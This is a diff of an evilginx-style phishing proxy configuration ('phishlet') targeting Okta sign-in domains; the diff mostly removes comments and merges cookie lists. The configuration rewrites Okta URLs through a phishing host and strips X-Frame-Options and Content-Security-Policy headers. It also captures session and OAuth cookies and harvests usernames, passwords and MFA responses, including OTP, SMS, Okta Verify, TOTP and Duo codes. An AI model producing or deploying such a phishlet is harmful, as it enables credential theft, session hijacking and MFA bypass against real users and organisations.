@@ -3,49 +3,30 @@ author: 'evilginx3'
 redirect_url: 'https://{domain}'
 
 proxy_hosts:
-  # Generic Okta domain wildcards
   - {phish_sub: '*', orig_sub: '*', domain: 'okta.com', session: true, is_landing: true, auto_filter: true}
   - {phish_sub: '*', orig_sub: '*', domain: 'oktapreview.com', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: '*', orig_sub: '*', domain: 'okta-emea.com', session: true, is_landing: false, auto_filter: true}
 
 sub_filters:
-  # Replace Okta domain URLs (supports any subdomain)
   - {triggers_on: '*.okta.com', orig_sub: '*', domain: 'okta.com', search: 'https://([a-zA-Z0-9-]+)\\.okta\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
   - {triggers_on: '*.oktapreview.com', orig_sub: '*', domain: 'oktapreview.com', search: 'https://([a-zA-Z0-9-]+)\\.oktapreview\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
   - {triggers_on: '*.okta-emea.com', orig_sub: '*', domain: 'okta-emea.com', search: 'https://([a-zA-Z0-9-]+)\\.okta-emea\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript']}
-  
-  # Remove security headers
   - {triggers_on: '*.okta.com', orig_sub: '*', domain: 'okta.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
   - {triggers_on: '*.okta.com', orig_sub: '*', domain: 'okta.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}
   - {triggers_on: '*.oktapreview.com', orig_sub: '*', domain: 'oktapreview.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
   - {triggers_on: '*.oktapreview.com', orig_sub: '*', domain: 'oktapreview.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}
 
 auth_tokens:
-  # Primary Okta authentication cookies (works with any Okta domain)
   - domain: '.okta.com'
-    keys: ['sid', 'DT', 'idx', 'JSESSIONID', 'oktaStateToken']
+    keys: ['sid', 'DT', 'idx', 'JSESSIONID', 'oktaStateToken', 't', 'dt', 'BC_BANDWIDTH', 'ADRUM', 'ADRUM_BT', 'okta-oauth-nonce', 'okta-oauth-state', 'okta-oauth-redirect-params']
     type: 'cookie'
     force_post: false
-  
   - domain: '.oktapreview.com'
     keys: ['sid', 'DT', 'idx', 'JSESSIONID', 'oktaStateToken']
     type: 'cookie'
     force_post: false
-  
   - domain: '.okta-emea.com'
     keys: ['sid', 'DT', 'idx', 'JSESSIONID', 'oktaStateToken']
-    type: 'cookie'
-    force_post: false
-  
-  # Device trust and session cookies
-  - domain: '.okta.com'
-    keys: ['t', 'dt', 'BC_BANDWIDTH', 'ADRUM', 'ADRUM_BT']
-    type: 'cookie'
-    force_post: false
-  
-  # OAuth and OIDC tokens
-  - domain: '.okta.com'
-    keys: ['okta-oauth-nonce', 'okta-oauth-state', 'okta-oauth-redirect-params']
     type: 'cookie'
     force_post: false
 
@@ -54,47 +35,34 @@ credentials:
     key: 'username'
     search: '(.*)'
     type: 'post'
-  
   password:
     key: 'password'
     search: '(.*)'
     type: 'post'
-  
-  # JSON-based credentials
   username_json:
     key: 'username'
     search: '(.*)'
     type: 'json'
-  
   password_json:
     key: 'password'
     search: '(.*)'
     type: 'json'
-  
-  # MFA codes
   otp_code:
     key: 'passCode'
     search: '(.*)'
     type: 'post'
-  
   sms_code:
     key: 'sms'
     search: '(.*)'
     type: 'post'
-  
-  # Okta Verify push
   verify_challenge:
     key: 'challengeResponse'
     search: '(.*)'
     type: 'json'
-  
-  # Google Authenticator / TOTP
   totp_code:
     key: 'answer'
     search: '(.*)'
     type: 'post'
-  
-  # Duo Security
   duo_response:
     key: 'sig_response'
     search: '(.*)'
@@ -115,4 +83,3 @@ login:
 path_rewrite:
   - trigger: '/verification'
     target: '/login/login.htm'
-
